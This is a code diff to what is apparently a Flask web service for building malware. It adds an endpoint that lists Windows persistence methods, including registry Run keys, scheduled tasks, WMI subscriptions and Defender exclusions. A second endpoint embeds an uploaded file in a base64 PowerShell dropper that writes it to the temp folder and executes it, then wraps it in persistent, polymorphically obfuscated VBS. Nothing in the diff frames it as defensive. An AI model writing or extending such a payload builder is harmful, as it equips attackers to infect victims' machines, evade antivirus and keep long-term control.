@@ -16,6 +16,7 @@ import shutil
 from payload_generator import PayloadGenerator
 from fingerprint_manager import FingerprintManager
 from payload_installer import create_one_click_payload
+from persistence_manager import create_persistent_payload
 
 app = Flask(__name__)
 CORS(app)
@@ -391,6 +392,96 @@ def get_one_click_styles():
         'silent': 'Silent installation with no output'
     }
     return jsonify({'styles': styles})
+
+
+@app.route('/api/persistence-methods', methods=['GET'])
+def get_persistence_methods():
+    """Get available persistence methods"""
+    methods = {
+        'registry': 'Registry HKCU/HKLM Run keys - All Windows versions',
+        'startup': 'Startup folder - All Windows versions',
+        'task': 'Windows Scheduled Tasks - Vista+',
+        'wmi': 'WMI Event Subscriptions - Vista+',
+        'service': 'Windows Service - All Windows (admin required)',
+        'defender': 'Windows Defender exclusions - Windows 8+',
+        'multi': 'Multiple methods for maximum redundancy - All Windows (RECOMMENDED)'
+    }
+    return jsonify({'methods': methods})
+
+
+@app.route('/api/generate-persistent', methods=['POST'])
+def generate_persistent_payload():
+    """Generate persistent payload that survives reboots"""
+    data = request.json
+    file_id = data.get('file_id')
+    technique = data.get('technique', 'base64')
+    persistence_method = data.get('persistence_method', 'multi')
+    obfuscation = data.get('obfuscation', 'high')
+
+    if not file_id:
+        return jsonify({'error': 'File ID required'}), 400
+
+    try:
+        # Find uploaded file
+        uploaded_file = None
+        for f in os.listdir(app.config['UPLOAD_FOLDER']):
+            if f.startswith(file_id):
+                uploaded_file = os.path.join(app.config['UPLOAD_FOLDER'], f)
+                break
+
+        if not uploaded_file or not os.path.exists(uploaded_file):
+            return jsonify({'error': 'File not found'}), 404
+
+        # Read file
+        with open(uploaded_file, 'rb') as f:
+            file_content = f.read()
+
+        # Convert to base64 for embedding in command
+        import base64
+        encoded_file = base64.b64encode(file_content).decode()
+
+        # Generate command that will decode and execute the file
+        filename = os.path.basename(uploaded_file)
+        cmd = (
+            f'powershell -NoProfile -Command '
+            f'"$f=\'$env:temp\\\\{filename}\'; '
+            f'[System.IO.File]::WriteAllBytes($f, '
+            f'[System.Convert]::FromBase64String(\'{encoded_file}\')); '
+            f'& $f"'
+        )
+
+        # Generate persistent payload
+        result = create_persistent_payload(cmd, persistence_method)
+
+        # Generate standard obfuscation on top
+        vbs_payload = result['vbs_code']
+
+        # Wrap in standard obfuscation
+        if technique != 'direct':
+            vbs_payload = payload_gen.create_polymorphic_wrapper(vbs_payload)
+
+        # Save payload to output
+        output_id = str(uuid.uuid4())[:8]
+        output_path = os.path.join(OUTPUT_FOLDER, f"{output_id}_persistent.vbs")
+
+        with open(output_path, 'w') as f:
+            f.write(vbs_payload)
+
+        return jsonify({
+            'success': True,
+            'output_id': output_id,
+            'payload': vbs_payload,
+            'size': len(vbs_payload),
+            'persistence_method': result['method'],
+            'method_name': result['method_name'],
+            'windows_versions': result['windows_versions'],
+            'survival_rate': result['survival_rate'],
+            'advantages': result['advantages'],
+            'timestamp': datetime.now().isoformat()
+        })
+
+    except Exception as e:
+        return jsonify({'error': f'Persistent payload generation failed: {str(e)}'}), 500
 
 
 if __name__ == '__main__':
